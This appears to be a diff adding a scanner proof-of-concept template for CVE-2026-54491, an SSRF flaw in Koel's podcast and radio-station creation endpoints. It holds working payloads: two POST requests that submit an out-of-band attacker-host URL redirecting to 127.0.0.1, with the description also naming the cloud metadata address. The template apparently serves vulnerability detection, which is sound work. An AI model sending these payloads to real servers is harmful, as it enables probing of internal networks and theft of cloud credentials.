@@ -1,0 +1,60 @@
+[info]
+author = "AVE"
+description = "检测 Koel 播客/电台创建接口是否存在 SSRF 漏洞。通过提交指向攻击者主机的播客 URL，该 URL 返回 302 重定向至内网地址（如 127.0.0.1 或 169.254.169.254），验证服务端是否跟随重定向发起内部请求"
+id = "POC-AVE-2026-0546"
+name = "CVE-2026-54491 PoC"
+severity = "high"
+tags = ["cve-2026-54491"]
+vuln_id = [
+    "CVE-2026-54491",
+    "AVE-2026-0546",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/podcasts"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"url":"http://{{interactsh-url}}/redirect?target=http://127.0.0.1:80/"}'
+type = "json"
+
+[poc.requests.headers]
+Accept = "application/json"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "podcast",
+    "created",
+    "id",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/radio/stations"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"url":"http://{{interactsh-url}}/redirect?target=http://127.0.0.1:80/","name":"SSRFTest"}'
+type = "json"
+
+[poc.requests.headers]
+Accept = "application/json"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "station",
+    "created",
+    "id",
+]
